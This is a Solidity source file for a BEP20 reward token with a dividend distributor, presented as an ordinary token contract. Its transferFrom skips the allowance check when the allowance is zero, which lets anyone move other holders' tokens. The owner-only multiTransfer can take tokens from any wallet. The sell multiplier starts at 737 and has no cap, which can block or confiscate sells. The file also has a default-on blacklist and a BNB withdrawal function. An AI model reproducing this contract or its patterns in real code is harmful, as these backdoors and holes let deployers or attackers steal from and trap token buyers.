// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

pragma experimental ABIEncoderV2;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function depositRewards() external payable;
    function depositReflections() external payable;
    function process(uint256 gas) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IBEP20 Reward;
    IBEP20 Token;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IDEXRouter router;

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 45 * 60;
    uint256 public minDistribution = 1 * (10 ** 13);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address reward_token, address token) {
        router = IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        _token = msg.sender;
        Reward = IBEP20(reward_token);
        Token = IBEP20(token);
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function depositRewards() external payable override onlyToken {
        uint256 balanceBefore = Reward.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(Reward);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = Reward.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function depositReflections() external payable override onlyToken {
        uint256 balanceBefore = Reward.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(Token);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = Token.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            Reward.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }
    
    function claimDividend() external {
        distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract RWRD is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address TEAM;
    address marketingToken;

    string _name;
    string _symbol;
    uint8 _decimals = 18;
    uint256 _totalSupply;

    uint256 public _maxTxAmount = _totalSupply;
    uint256 public _maxWalletToken = _totalSupply;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    bool public blacklistMode = true;
    mapping (address => bool) public isBlacklisted;


    mapping (address => bool) isExcludedFromFees;
    mapping (address => bool) isExcludedFromTx;
    mapping (address => bool) isExcludedFromRewards;
    mapping (address => bool) isExcludedFromTimeLock;
    mapping (address => bool) isExcludedFromReflections;
    mapping (address => bool) isExcludedFromMaxTx;
    mapping (address => bool) isExcludedFromMaxWallet;

    struct Fees {
        uint256 buyLiquidityTax;
        uint256 sellLiquidityTax;
        uint256 buyReflectionTax;
        uint256 sellReflectionTax;
        uint256 buyMarketingTax;
        uint256 sellMarketingTax;
        uint256 buyRewardsTax;
        uint256 sellRewardsTax;
    }

    uint256 public buyLiquidityTax;
    uint256 public sellLiquidityTax;
    uint256 public buyReflectionTax;
    uint256 public sellReflectionTax;
    uint256 public buyMarketingTax;
    uint256 public sellMarketingTax;
    uint256 public buyRewardsTax;
    uint256 public sellRewardsTax;
    uint256 public totalBuyTax;
    uint256 public totalSellTax;
    uint256 public totalTax;
    uint256 public feeDenominator  = 100;

    uint256 public sellMultiplier  = 737;

    address public autoLiquidityReceiver;
    address public marketingTaxWallet;

    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;

    bool public tradingOpen = false;

    DividendDistributor public distributor;
    uint256 distributorGas = 500000;

    bool public buyCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 10;
    mapping (address => uint) private cooldownTimer;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 30 / 10000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor (
        string memory name_,
        string memory symbol_,
        uint256 _supply,
        Fees memory fees,
        address rwrd_token,
        address team_wallet,
        address marketing_token
    ) Auth(msg.sender) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = _supply;

        buyLiquidityTax = fees.buyLiquidityTax;
        sellLiquidityTax = fees.sellLiquidityTax;
        buyReflectionTax = fees.buyReflectionTax;
        sellReflectionTax = fees.sellReflectionTax;
        buyMarketingTax = fees.buyMarketingTax;
        sellMarketingTax = fees.sellMarketingTax;
        buyRewardsTax = fees.buyRewardsTax;
        sellRewardsTax = fees.sellRewardsTax;
        totalBuyTax = buyLiquidityTax + buyReflectionTax + buyMarketingTax + buyRewardsTax;
        totalSellTax = sellLiquidityTax + sellReflectionTax + sellMarketingTax + sellRewardsTax;
        totalTax = totalBuyTax + totalSellTax;

        TEAM = team_wallet;
        marketingToken = marketing_token;

        router = IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);

        distributor = new DividendDistributor(address(rwrd_token), address(this));

        isExcludedFromFees[msg.sender] = true;
        isExcludedFromFees[address(TEAM)] = true;

        isExcludedFromMaxTx[msg.sender] = true;
        isExcludedFromMaxTx[address(TEAM)] = true;

        isExcludedFromMaxWallet[msg.sender] = true;
        isExcludedFromMaxWallet[address(TEAM)] = true;

        isExcludedFromTimeLock[msg.sender] = true;
        isExcludedFromTimeLock[address(TEAM)] = true;
        isExcludedFromTimeLock[DEAD] = true;
        isExcludedFromTimeLock[address(this)] = true;

        isExcludedFromRewards[pair] = true;
        isExcludedFromRewards[address(router)] = true;
        isExcludedFromRewards[address(this)] = true;
        isExcludedFromRewards[address(TEAM)] = false;
        isExcludedFromRewards[DEAD] = true;

        isExcludedFromReflections[pair] = true;
        isExcludedFromReflections[address(router)] = true;
        isExcludedFromReflections[address(this)] = true;
        isExcludedFromReflections[address(TEAM)] = false;
        isExcludedFromReflections[DEAD] = true;

        autoLiquidityReceiver = address(TEAM);
        marketingTaxWallet = address(TEAM);

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external view override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(0)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner() {
        _maxWalletToken = (_totalSupply * maxWallPercent_base1000 ) / 1000;
    }
    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner() {
        _maxTxAmount = (_totalSupply * maxTXPercentage_base1000 ) / 1000;
    }

    function setMaxTx(uint256 amount) external authorized {
        _maxTxAmount = amount;
    }


    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
        }

        // Blacklist
        if(blacklistMode){
            require(!isBlacklisted[sender] && !isBlacklisted[recipient],"Blacklisted");    
        }


        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingTaxWallet && recipient != autoLiquidityReceiver){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        
        if (sender == pair &&
            buyCooldownEnabled &&
            !isExcludedFromTimeLock[recipient]) {
            require(cooldownTimer[recipient] < block.timestamp,"Please wait for 1min between two buys");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }

        // Checks max transaction limit
        checkMaxTx(sender, amount);

        if(shouldSwapBack()){ swapBack(); }

        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount,(recipient == pair)) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        // Dividend tracker
        if(!isExcludedFromRewards[sender] || !isExcludedFromReflections[sender]) {
            try distributor.setShare(sender, _balances[sender]) {} catch {}
        }

        if(!isExcludedFromRewards[recipient] || !isExcludedFromReflections[recipient]) {
            try distributor.setShare(recipient, _balances[recipient]) {} catch {} 
        }

        try distributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkMaxTx(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isExcludedFromMaxTx[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isExcludedFromFees[sender];
    }

    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        
        uint256 multiplier = isSell ? sellMultiplier : 100;
        uint256 feeAmount = amount.mul(totalTax).mul(multiplier).div(feeDenominator * 100);
        

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function clearStuckBalance(uint256 amountPercentage) external authorized {
        uint256 amountBNB = address(this).balance;
        uint256 amountToSwap = amountBNB * amountPercentage / 100;

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(marketingToken);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value:amountToSwap}(
            0,
            path,
            address(marketingTaxWallet),
            block.timestamp
        );
    }

    function clearStuckBalance_sender(uint256 amountPercentage) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
    }

    function set_sell_multiplier(uint256 Multiplier) external onlyOwner{
        sellMultiplier = Multiplier;        
    }

    // switch Trading
    function tradingStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }

    // enable cooldown between trades
    function cooldownEnabled(bool _status, uint8 _interval) public onlyOwner {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : sellLiquidityTax;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalSellTax).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalSellTax.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBReflection = amountBNB.mul(sellReflectionTax).div(totalBNBFee);
        uint256 amountBNBReward = amountBNB.mul(sellRewardsTax).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.mul(sellMarketingTax).div(totalBNBFee);

        try distributor.depositReflections{value: amountBNBReflection}() {} catch {}
        try distributor.depositRewards{value: amountBNBReward}() {} catch {}
        
        address[] memory _path = new address[](2);
        _path[0] = WBNB;
        _path[1] = address(marketingToken);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value:amountBNBMarketing}(
            0,
            _path,
            address(marketingTaxWallet),
            block.timestamp
        );

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }


    function setIsExcludedFromRewards(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair);
        isExcludedFromRewards[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);
        }else{
            distributor.setShare(holder, _balances[holder]);
        }
    }

    function enable_blacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }

    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }


    function setIsExcludedFromFees(address holder, bool exempt) external authorized {
        isExcludedFromFees[holder] = exempt;
    }

    function setIsExcludedFromMaxTx(address holder, bool exempt) external authorized {
        isExcludedFromMaxTx[holder] = exempt;
    }

    function setIsExcludedFromTx(address holder, bool exempt) external authorized {
        isExcludedFromTx[holder] = exempt;
    }

    function setIsExcludedFromTimeLock(address holder, bool exempt) external authorized {
        isExcludedFromTimeLock[holder] = exempt;
    }

    function setIsExcludedFromMaxWallet(address holder, bool exempt) external authorized {
        isExcludedFromMaxWallet[holder] = exempt;
    }

    function setIsExcludedFromReflections(address holder, bool exempt) external authorized {
        isExcludedFromReflections[holder] = exempt;
    }

    function setFees(Fees memory fees, uint256 _feeDenominator) external authorized {
        buyLiquidityTax = fees.buyLiquidityTax;
        sellLiquidityTax = fees.sellLiquidityTax;
        buyReflectionTax = fees.buyReflectionTax;
        sellReflectionTax = fees.sellReflectionTax;
        buyMarketingTax = fees.buyMarketingTax;
        sellMarketingTax = fees.sellMarketingTax;
        buyRewardsTax = fees.buyRewardsTax;
        sellRewardsTax = fees.sellRewardsTax;
        totalBuyTax = buyLiquidityTax + buyReflectionTax + buyMarketingTax + buyRewardsTax;
        totalSellTax = sellLiquidityTax + sellReflectionTax + sellMarketingTax + sellRewardsTax;
        totalTax = totalBuyTax + totalSellTax;
        feeDenominator = _feeDenominator;
        require(totalTax < feeDenominator/3, "Fees cannot be more than 33%");
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver ) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingTaxWallet = _marketingFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000);
        distributorGas = gas;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }



/* Airdrop */
function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {

    require(addresses.length < 501,"GAS Error: max airdrop limit is 500 addresses");
    require(addresses.length == tokens.length,"Mismatch between Address and token count");

    uint256 SCCC = 0;

    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];
    }

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens[i]);
        if(!isExcludedFromRewards[addresses[i]] || !isExcludedFromReflections[addresses[i]]) {
            try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {} 
        }
    }

    // Dividend tracker
    if(!isExcludedFromRewards[from] || !isExcludedFromReflections[from]) {
        try distributor.setShare(from, _balances[from]) {} catch {}
    }
}

function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {

    require(addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");

    uint256 SCCC = tokens * addresses.length;

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens);
        if(!isExcludedFromRewards[addresses[i]] || !isExcludedFromReflections[addresses[i]]) {
            try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {} 
        }
    }

    // Dividend tracker
    if(!isExcludedFromRewards[from] || !isExcludedFromReflections[from]) {
        try distributor.setShare(from, _balances[from]) {} catch {}
    }
}

event AutoLiquify(uint256 amountBNB, uint256 amountBOG);

}